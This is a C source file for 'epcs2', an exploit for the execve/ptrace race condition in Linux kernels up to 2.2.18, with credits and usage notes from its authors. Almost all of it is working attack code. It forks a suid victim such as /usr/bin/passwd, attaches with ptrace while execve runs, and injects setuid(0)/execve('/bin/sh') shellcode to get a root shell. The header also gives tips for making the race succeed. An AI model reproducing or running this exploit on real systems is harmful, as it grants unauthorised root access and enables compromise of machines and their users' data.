/*
 * epcs2 (improved by lst [liquid@dqc.org])
 * ~~~~~~~
 * exploit for execve/ptrace race condition in Linux kernel up to 2.2.18
 *
 * originally by:
 * (c) 2001 Wojciech Purczynski / cliph / <wp@elzabsoft.pl>
 *
 * improved by:
 * lst [liquid@dqc.org]
 *
 * This sploit does _not_ use brute force. It does not need that.
 * It does only one attemt to sploit the race condition in execve. 
 * Parent process waits for a context-switch that occur after 
 * child task sleep in execve.
 *
 * It should work even on openwall-patched kernels (I haven't tested it).
 *
 * Compile it:
 *	cc epcs.c -o epcs
 * Usage:
 *	./epcs [victim]
 *
 * It gives instant root shell with any of a suid binaries.
 *
 * If it does not work, try use some methods to ensure that execve
 * would sleep while loading binary file into memory,
 *
 * 	i.e.: cat /usr/lib/* >/dev/null 2>&1
 *
 * Tested on RH 7.0 and RH 6.2 / 2.2.14 / 2.2.18 / 2.2.18ow4
 * This exploit does not work on 2.4.x because kernel won't set suid 
 * privileges if user ptraces a binary.
 * But it is still exploitable on these kernels.
 *
 * Thanks to Bulba (he made me to take a look at this bug ;) )
 * Greetings to SigSegv team.
 *
 * -- d00t
 * improved by lst [liquid@dqc.org]
 * props to kevin for most of the work
 *
 * now works on stack non-exec systems with some neat trickery for the automated
 * method, ie. no need to find the bss segment via objdump
 *
 * particularly it now rewrites the code instruction sets in the 
 * dynamic linker _start segment and continues execution from there.
 * 
 * an aside, due to the fact that the code self-modified, it wouldnt work
 * quite correctly on a stack non-exec system without playing directly with
 * the bss segment (ie no regs.eip = regs.esp change).  this is much more 
 * automated.  however, do note that the previous version did not trigger stack 
 * non-exec warnings due to how it was operating.  note that the regs.eip = regs.esp 
 * method will break on stack non-exec systems.
 *
 * as always.. enjoy.
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>
#include <linux/user.h>
#include <sys/wait.h>
#include <limits.h>
#include <errno.h>
#include <stdlib.h>

#define CS_SIGNAL SIGUSR1
#define VICTIM "/usr/bin/passwd"
#define SHELL "/bin/sh"

/*
 * modified simple shell code with some trickery (hand tweaks)
 */
char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"	/* setuid(0) */
  "\x31\xc0\xb0\x2e\xcd\x80" "\x31\xc0\x50\xeb\x17\x8b\x1c\x24"	/* execve(SHELL) */
  "\x90\x90\x90\x89\xe1\x8d\x54\x24"	/* lets be tricky */
  "\x04\xb0\x0b\xcd\x80\x31\xc0\x89" "\xc3\x40\xcd\x80\xe8\xe4\xff\xff" "\xff" SHELL "\x00\x00\x00";	/* pad me */

volatile int cs_detector = 0;

void
cs_sig_handler (int sig)
{
  cs_detector = 1;
}

void
do_victim (char *filename)
{
  while (!cs_detector);
  kill (getppid (), CS_SIGNAL);
  execl (filename, filename, NULL);
  perror ("execl");
  exit (-1);
}

int
check_execve (pid_t victim, char *filename)
{
  char path[PATH_MAX + 1];
  char link[PATH_MAX + 1];
  int res;

  snprintf (path, sizeof (path), "/proc/%i/exe", (int) victim);
  if (readlink (path, link, sizeof (link) - 1) < 0)
  {
    perror ("readlink");
    return -1;
  }

  link[sizeof (link) - 1] = '\0';
  res = !strcmp (link, filename);
  if (res)
    fprintf (stderr, "child slept outside of execve\n");
  return res;
}

int
main (int argc, char *argv[])
{
  char *filename = VICTIM;
  pid_t victim;
  int error, i;
  struct user_regs_struct regs;

/* take our command args if you wanna play with other progs */
  if (argc > 1)
    filename = argv[1];

  signal (CS_SIGNAL, cs_sig_handler);

  victim = fork ();
  if (victim < 0)
  {
    perror ("fork: victim");
    exit (-1);
  }
  if (victim == 0)
    do_victim (filename);

  kill (victim, CS_SIGNAL);
  while (!cs_detector);

  if (ptrace (PTRACE_ATTACH, victim))
  {
    perror ("ptrace: PTRACE_ATTACH");
    goto exit;
  }

  if (check_execve (victim, filename))
    goto exit;

  (void) waitpid (victim, NULL, WUNTRACED);
  if (ptrace (PTRACE_CONT, victim, 0, 0))
  {
    perror ("ptrace: PTRACE_CONT");
    goto exit;
  }

  (void) waitpid (victim, NULL, WUNTRACED);

  if (ptrace (PTRACE_GETREGS, victim, 0, &regs))
  {
    perror ("ptrace: PTRACE_GETREGS");
    goto exit;
  }

/* make sure that last null is in there */
  for (i = 0; i <= strlen (shellcode); i += 4)
  {
    if (ptrace (PTRACE_POKETEXT, victim, regs.eip + i,
		*(int *) (shellcode + i)))
    {
      perror ("ptrace: PTRACE_POKETEXT");
      goto exit;
    }
  }

  if (ptrace (PTRACE_SETREGS, victim, 0, &regs))
  {
    perror ("ptrace: PTRACE_SETREGS");
    goto exit;
  }

  fprintf (stderr, "bug exploited successfully.\nenjoy!\n");

  if (ptrace (PTRACE_DETACH, victim, 0, 0))
  {
    perror ("ptrace: PTRACE_DETACH");
    goto exit;
  }

  (void) waitpid (victim, NULL, 0);
  return 0;

exit:
  fprintf (stderr, "d0h! error!\n");
  kill (victim, SIGKILL);
  return -1;
}

